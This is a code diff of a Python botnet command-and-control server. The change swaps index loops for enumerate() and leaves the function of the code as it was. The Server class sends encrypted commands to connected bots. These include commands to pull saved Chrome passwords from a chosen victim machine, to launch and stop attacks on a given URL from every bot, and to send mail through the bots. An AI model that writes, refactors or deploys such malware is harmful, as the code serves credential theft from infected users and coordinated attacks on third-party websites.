@@ -54,8 +54,8 @@ class Server:
         print(self.ipList)
 
     def sendCommand(self, cmd):
-        for i in range(len(self.connected)):
-            self.connected[i].send(self.keys[i].encrypt(cmd.encode()))
+        for i, item in enumerate(self.connected):
+            item.send(self.keys[i].encrypt(cmd.encode()))
 
     def getOnlineBots(self):
         return len(self.connected)
@@ -77,24 +77,24 @@ class Server:
         Mail(subject, content, file, filename, self.connected, self.keys)
 
     def showPass(self, ask_from):
-        for i in range(len(self.connected)):
-            if ask_from == self.connected[i].getpeername():
-                self.connected[i].send(self.keys[i].encrypt("%$chromePass".encode()))
-                print(self.keys[i].decrypt(self.connected[i].recv(1024)).decode())
+        for i, item in enumerate(self.connected):
+            if ask_from == item.getpeername():
+                item.send(self.keys[i].encrypt("%$chromePass".encode()))
+                print(self.keys[i].decrypt(item.recv(1024)).decode())
 
     def attack(self, url, type):
         try:
             print(url)
             type = type.replace(" ", "")
             print(type)
-            for i in range(len(self.connected)):
-                self.connected[i].send(self.keys[i].encrypt(("%$Att " + type + " " + url).encode()))
+            for i, item in enumerate(self.connected):
+                item.send(self.keys[i].encrypt(("%$Att " + type + " " + url).encode()))
         except Exception as e:
             print(e)
 
     def stopattack(self):
-        for i in range(len(self.connected)):
-            self.connected[i].send(self.keys[i].encrypt(("%$StopAtt").encode()))
+        for i, item in enumerate(self.connected):
+            item.send(self.keys[i].encrypt(("%$StopAtt").encode()))
 
 open("IP.txt", 'w')
 ip = "0.0.0.0"
